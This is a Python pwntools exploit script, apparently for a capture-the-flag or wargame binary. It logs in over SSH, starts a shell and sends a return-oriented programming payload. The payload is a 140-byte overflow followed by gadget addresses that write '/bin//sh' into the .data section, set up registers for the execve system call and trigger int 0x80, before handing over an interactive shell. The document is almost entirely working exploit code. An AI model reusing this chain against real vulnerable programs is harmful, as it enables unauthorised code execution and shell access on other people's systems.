#!/usr/bin/python
import sys
from pwn import *

# Thx to https://beta.hackndo.com/return-oriented-programming/


USERNAME=""
PASSWORD=""
HOST=""
FILE=""

def connect_remote(username, password, host):
    try:
        s = ssh(host=host, user=username, password=password)
    except:
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    if not s.connected():
        print "[!] Couldn't connect on remote host (\"%s\")" % (host)
        sys.exit(1)
    return s

def process_local():
    pass

if __name__ == "__main__":
    p = connect_remote(USERNAME, PASSWORD, HOST)
    shell = p.run("sh")

    shell.sendline(FILE)

    print "PID: %d" % (p.pid)

    payload = "A"*140

    payload += p32(0x0806ec5a) # pop edx; ret
    payload += p32(0x080eb060) # @ of .data section
    payload += p32(0x080bbf26)
    payload += "/bin"
    payload += p32(0x0809a95d) # mov dword ptr [edx], eax; ret

    payload += p32(0x0806ec5a) # pop edx; ret
    payload += p32(0x080eb060 + 4) # @ of .data section
    payload += p32(0x080bbf26)
    payload += "//sh"
    payload += p32(0x0809a95d) # mov dword ptr [edx], eax; ret


    payload += p32(0x0806ec5a) # pop edx; ret
    payload += p32(0x080eb060 + 8)

    payload += p32(0x080544e0) # xor eax, eax
    payload += p32(0x0809a95d) # mov dword ptr [edx], eax; ret


    payload += p32(0x080481c9) # pop ebx; ret
    payload += p32(0x080eb060)

    payload += p32(0x080e55ad) # pop ecx; ret
    payload += p32(0x00000000)


    payload += p32(0x0806ec5a) # pop edx; ret
    payload += p32(0x00000000)


    payload += p32(0x080544e0) # xor eax, eax

    for i in range(0, 11):
        payload += p32(0x0807b6b6) # inc eax, ret

    payload += p32(0x08049401) # call int 0x80

    shell.sendline(payload)
    shell.interactive()
